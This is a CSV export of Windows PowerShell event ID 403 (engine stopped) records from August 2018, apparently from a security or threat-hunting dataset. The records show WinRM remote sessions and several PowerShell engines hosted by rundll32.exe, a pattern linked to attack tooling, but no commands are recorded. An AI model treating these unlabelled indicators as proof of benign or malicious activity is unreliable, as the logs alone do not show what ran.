TimeCreated,Details,EventID
8/28/2018 23:32,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=25

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=21848d92-e508-4a97-957f-2f7e41842488
	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=5e1ba1ed-f9d0-456f-b86d-570d5186ca3f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/28/2018 23:21,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=49

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d5b44eeb-84a8-498d-ae6f-a96874da5b94
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=75a58133-0900-4d34-ac48-04570dccf310
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/28/2018 22:00,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=22703b88-720d-4b71-8d9e-bcbd61f5c593
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=a77ca6fb-ed06-458a-9541-38e35358c3b0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/28/2018 20:59,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=25

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=a027dbe9-2dea-42f1-bb1e-723e19654135
	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=fb9c7d8e-7824-46ec-97b3-d59a88b9c3fd
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/28/2018 20:58,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=55

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=1b909dfa-0669-456a-8253-24cad06a9d71
	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=38725bb4-ab93-4ac7-b861-6106cb1f5993
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/28/2018 20:58,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=53

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=38dcf4cb-6379-47ff-ac9c-8a2f3470bb60
	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=042d679a-d0eb-42ee-99fa-6a18afa2e7af
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/25/2018 0:50,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=54a86788-fc97-4c57-80c0-c1acc7cfc77c
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=6af35a11-d609-4cb5-a376-5ce0b7b2ef0d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/25/2018 0:33,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=26a6c26b-d2c0-4a1a-93b6-049711168462
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=74175333-67bd-451b-94b1-52dc0dbecb44
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/24/2018 23:52,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=76bdb782-9e44-4b33-9084-a45a7a0fe8d9
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=84119f84-544a-45c9-b281-75d653be9824
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/24/2018 23:30,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=05f8b083-7511-4703-8d1e-ae9490e516b9
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=b3deaec5-bea4-46a6-bfa8-740e47b45db7
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/22/2018 8:55,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=7147

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d9ac080b-6acf-4f30-80eb-6d19ec09810f
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=d485f447-a557-44b0-8d6f-46ed4e132a9a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/22/2018 0:48,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=810a9fd0-f179-4167-85bd-07adf2a7f7b3
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=2f288e70-ca14-4458-8a79-cbb5e802770a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/17/2018 6:51,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=3a893e33-de95-4c1a-b43c-363a6e98503c
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=9adb101b-d815-4516-97c0-ec407f298011
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/17/2018 6:10,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=9ba4be04-ee90-4535-b99b-f3d999fe8c48
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=bb6ffd5c-2e14-4383-80ff-e903a1313e8c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/17/2018 5:57,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=b416b58c-e00a-4ea6-83ba-bd345bd1837d
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=95b2588d-2534-4bf8-b76b-e647b15eaef5
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/17/2018 4:04,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=af5deeaa-4857-43b8-af35-2c45213dd3c0
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=11f3eeb0-994a-4552-b469-89d62ccf317f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/17/2018 4:04,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=183da83b-e5e8-4983-975d-fcbfb8876424
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=638e5220-c19e-487b-ae3b-e0176ea34991
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/17/2018 4:03,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=fda8a96e-b992-4412-b4b3-270271b5ee81
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=17f944c7-8dc1-4af7-9c56-d8f3a91e40fb
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/17/2018 4:02,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=cb2a9e46-6f33-4cba-8225-7c45bc95291c
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=b145db71-11ff-4cd9-901d-44b6815a5acd
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/16/2018 19:14,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=f7495da1-91ac-4f6e-b36f-9b8cce16170f
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=04284efa-bbd9-4cac-b620-7451a2a8897b
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/16/2018 19:10,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=84ac741f-00ef-4719-bce2-8f76b8b4475f
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=2acab1cb-8e37-429c-9726-f7692e748b19
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 19:17,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=59

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=911adf1f-6281-4daf-8afb-cb59c198fe8c
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=78473fb5-9d0d-4169-b1af-6b68d2364ef0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 19:07,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=2217

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=22720aac-dd32-4d15-8eab-6a6274c4903e
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=be2fe1af-08fb-4ab3-b7ae-58428bf2a5bc
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 19:00,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=2567

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=e88ad3f4-2032-4e5f-826c-6ca6259d5cdc
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=3268bd0a-4fb2-4199-8dbb-911d58321bcd
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:40,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=361

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d9782e59-2987-4da0-b8df-5f15521d9297
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=50ec4d64-a213-442f-9f6b-c9e600532811
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=1543

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=adc556b8-0a10-4bc8-abac-9fac0e1de9f6
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=12462643-785f-4c49-b568-77280bb2c2e2
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=23

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=10852c9c-13c6-499f-bba1-f179f9f14deb
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=b5ff2f66-fca7-4e16-9a12-5351a48c0146
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=75

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=a2d66ee0-1787-4fa5-a4e3-944e2211df15
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=2b2f3a5d-4fd1-4483-95a1-ccbb1538245c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=75

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=8a6d176e-1b15-4182-80fd-e2071f193d64
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=75226fd5-98b3-48ac-8a7c-4dd5ef122ab0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=579

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=6bb5939b-acd4-458d-a419-abc0bc6cc7e2
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=39843d23-b2d3-4162-bc60-75831405d432
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=496ba2d8-fe48-4f18-93f0-48a00b857c85
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=8587b0d7-ac3a-4eda-9268-aacdbda4174a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=ca9b8d89-2641-479e-98fb-93219113350b
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=572a206e-99d5-47d0-805b-15804cf36c2a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=295

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=09224808-6bf5-422f-abde-1636768b59be
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=082731da-dcd9-4d7d-85c9-364c4ecde37a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:32,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=2747

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=3367239b-8f30-4f1e-aec8-b9f8c6869c28
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=e666d539-477f-456c-a676-f835fdd52d52
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 18:24,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=185

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=ee627473-0999-4c35-8c0b-facea2a123c0
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=b7f1bba6-4c21-44c1-99ba-f58aa81d59f3
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
